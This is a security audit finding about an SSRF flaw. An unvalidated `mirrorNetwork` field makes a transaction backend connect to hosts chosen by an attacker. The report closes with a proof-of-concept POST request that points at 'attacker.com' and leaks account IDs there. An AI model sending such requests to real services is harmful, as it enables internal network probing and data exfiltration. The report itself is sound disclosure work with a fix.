Audit Report

## Title
SSRF via Unvalidated `mirrorNetwork` Field in Transaction Submission Causes Backend to Make Arbitrary Outbound Connections

## Summary
The `mirrorNetwork` field in `CreateTransactionDto` accepts any non-empty string with no allowlist enforcement. When a transaction is submitted, the backend uses this attacker-controlled value to open a GRPC connection (via `AddressBookQuery`) and later an HTTP connection (via `MirrorNodeClient.fetchAccountInfo`) to arbitrary attacker-controlled hosts.

## Finding Description

**Root cause â€” no allowlist on `mirrorNetwork`:**

`CreateTransactionDto` only enforces `@IsNotEmpty()` and `@IsString()` on `mirrorNetwork`: [1](#0-0) 

Any authenticated user can supply an arbitrary string such as `"attacker.com"`.

**Sink 1 â€” GRPC connection during transaction creation:**

`createTransactions` immediately passes `dtos[0].mirrorNetwork` to `getClientFromNetwork`: [2](#0-1) 

Inside `getClientFromNetwork`, when the value does not match `mainnet`, `testnet`, `previewnet`, or `local-node`, the code falls through to the default branch, which calls `MirrorNetworkGRPC.fromBaseURL(mirrorNetwork[0])` and then executes an `AddressBookQuery` (GRPC) against the resulting host: [3](#0-2) 

`MirrorNetworkGRPC.fromBaseURL` constructs `["attacker.com:443"]` in its `default` branch: [4](#0-3) 

**Sink 2 â€” HTTP connection during account-info fetch:**

The `mirrorNetwork` value is persisted to the database (line 449 of `transactions.service.ts`). Later, when the chain service computes signature keys, it calls `MirrorNodeClient.fetchAccountInfo(accountId, mirrorNetwork)`, which internally calls `getMirrorNodeRESTURL(mirrorNetwork)`: [5](#0-4) 

`getMirrorNodeRESTURL` calls `MirrorNodeREST.fromBaseURL(mirrorNetwork)`: [6](#0-5) 

`MirrorNodeREST.fromBaseURL` falls through to its `default` branch, producing `https://attacker.com`: [7](#0-6) 

The backend then issues an HTTP GET to `https://attacker.com/api/v1/accounts/<accountId>`.

## Impact Explanation

The backend server makes attacker-directed outbound TCP (GRPC port 443) and HTTP connections. This enables:

- **Internal network probing**: The backend's IP is trusted inside the deployment; an attacker can map internal services by observing connection timing and error responses.
- **Data exfiltration**: HTTP requests carry `accountId` values in the URL path, leaking account identifiers to the attacker's server.
- **Interaction with internal services**: If internal services are reachable from the backend container, GRPC/HTTP connections can be directed at them.
- **Persistent SSRF**: Because `mirrorNetwork` is stored in the database, every subsequent chain-service processing cycle re-issues the outbound request without any further user interaction.

## Likelihood Explanation

Any authenticated user (no admin privileges required) can trigger this by submitting a single `POST /transactions` request with `mirrorNetwork` set to an arbitrary host. The `default` branches in both `MirrorNodeREST.fromBaseURL` and `MirrorNetworkGRPC.fromBaseURL` are intentionally designed to support custom networks, making this a reachable and intended code path that simply lacks a server-side allowlist. No special tooling is required â€” a standard HTTP client suffices.

## Recommendation

Introduce a server-side allowlist for `mirrorNetwork` in `CreateTransactionDto`. Use a custom validator or `@IsIn([MAINNET, TESTNET, PREVIEWNET, LOCAL_NODE])` to reject any value not in the set of known networks. If custom network support is a product requirement, it should be restricted to administrator-level users and validated against a configurable allowlist rather than accepted from any authenticated user.

## Proof of Concept

```http
POST /transactions HTTP/1.1
Authorization: Bearer <valid_user_token>
Content-Type: application/json

{
  "name": "SSRF Test",
  "description": "SSRF via mirrorNetwork",
  "transactionBytes": "<valid_hex>",
  "signature": "<valid_hex>",
  "creatorKeyId": 1,
  "mirrorNetwork": "attacker.com"
}
```

1. The backend calls `getClientFromNetwork("attacker.com")`.
2. `MirrorNetworkGRPC.fromBaseURL("attacker.com")` returns `["attacker.com:443"]`.
3. `new AddressBookQuery().execute(client)` opens a GRPC connection to `attacker.com:443`.
4. The transaction is saved with `mirrorNetwork = "attacker.com"`.
5. The chain service later calls `fetchAccountInfo(accountId, "attacker.com")`, issuing `GET https://attacker.com/api/v1/accounts/<accountId>`.
